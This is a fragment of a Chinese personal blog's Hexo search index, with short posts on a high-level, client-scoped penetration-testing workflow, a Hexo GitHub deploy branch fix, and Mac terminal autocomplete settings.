&#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    // 输出</span><br><span class="line">    printf(&quot;%d %d&quot;, black, white);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>测试</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>网站渗透测试流程</title>
    <url>/2022/07/04/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<span id="more"></span>


<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><ol>
<li>确定范围：测试目标的范围，IP、域名、内外网</li>
<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等</li>
<li>确定需求：web应用的漏洞（新上线程序）？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等</li>
<li>根据需求和技术能力来确定自己能不能做，能做多少</li>
</ol>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
<li>方式：主动扫描、开放搜索等</li>
<li>开放搜索：利用搜索引擎获得、后台、未授权页面、敏感URL等</li>
<li>基础信息：IP、网段、域名、端口</li>
<li>系统信息：操作系统版本</li>
<li>应用信息：各端口的应用，例如web应用、邮件应用等</li>
<li>版本信息：所有这些探测到的东西的版本</li>
<li>服务信息</li>
<li>人员信息：域名注册人员信息、web应用中网站发帖ID、管理员姓名等</li>
<li>防护信息：试着看能否探测到防护设备</li>
</ol>
<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>利用上一步列出的各种系统和应用等相应的漏洞</p>
<ol>
<li>方法：<ul>
<li>漏扫、AWVS、IBM appscan等</li>
<li>结合漏洞去exploit-db等位置找利用</li>
<li>网上寻找验证poc</li>
</ul>
</li>
<li>内容：<ul>
<li>系统漏洞：系统没有及时打补丁</li>
<li>Webserver漏洞：Webserver配置问题</li>
<li>Web应用漏洞：Web应用开发问题</li>
<li>其他端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
<li>通信安全：明文传输、token在cookie中传输等</li>
</ul>
</li>
</ol>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>将上一步发现的有可能可以成功利用的全部漏洞都验证一边，结合实际情况搭建模拟环境试验，成功后再应用于目标中</p>
<ul>
<li>自动化验证：结合自动化扫描工具提供的结果</li>
<li>手工验证：根据公开资源进行验证</li>
<li>试验验证：自己搭建模拟环境进行验证</li>
<li>登陆猜解：有时可以尝试猜测破解一下登录的账号密码等信息</li>
<li>业务漏洞验证：如发现业务漏洞要进行验证</li>
</ul>
<h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><ol>
<li>按需整理：按照之前第一步跟客户确定好的范围、需求来整理资料，并将其形成报告</li>
<li>补充介绍：对漏洞成因、验证过程和带来危害进行分析</li>
<li>修补建议：对所有产生的问题提出合理高效安全的解决办法</li>
</ol>
<hr>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1kT411576m?p=9&share_source=copy_web">哔哩哔哩网站渗透测试流程教程</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Hexo部署Github时页面显示问题</title>
    <url>/2022/08/12/%E8%A7%A3%E5%86%B3Hexo%E9%83%A8%E7%BD%B2Github%E6%97%B6%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>检查 <code>_config.yml</code> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:xinkjung  # 仓库地址</span><br><span class="line">  branch: master  # hexo </span><br></pre></td></tr></table></figure>

<p>发现不知道什么时候改为了 <code>hexo</code> ，文件都上传到 <code>hexo</code> 目录下去了，修改为 <code>master</code> 即可。</p>
<p>然后执行命令 <code>hexo clean</code>、<code>hexo d -g</code>尝试，这样就成功解决了。</p>
]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>配置MAC终端自动补全命令行</title>
    <url>/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
    <content><![CDATA[<ol>
<li>打开终端，在命令行输入 <code>nano .inputrc</code> 然后回车运行会进入一个编辑页面</li>
<li>将下列语句输入到文件中：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set completion-ignore-case on</span><br><span class="line">set show-all-if-ambiguous on</span><br><span class="line">TAB: menu-complete</span><br></pre></td></tr></table></figure>
<img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/1.inputrc.png" alt=".inputrc"></li>
<li>输入完成之后 <code>Control + O</code> 保存文件然后按回车，之后 <code>Control + X</code> 退出编辑页面，然后重启终端就可以了（可以再次执行步骤1检查是否正确输入）<br><img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/2.success.png" alt="success"></li>
</ol>
<hr>
<p><strong>参考链接</strong></p>
<p><a href="https://blog.csdn.net/qq_41134710/article/details/118573124">如何配置MAC的终端自动补全命令行</a></p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Mac</tag>
      </tags>
  </entry>
</search>
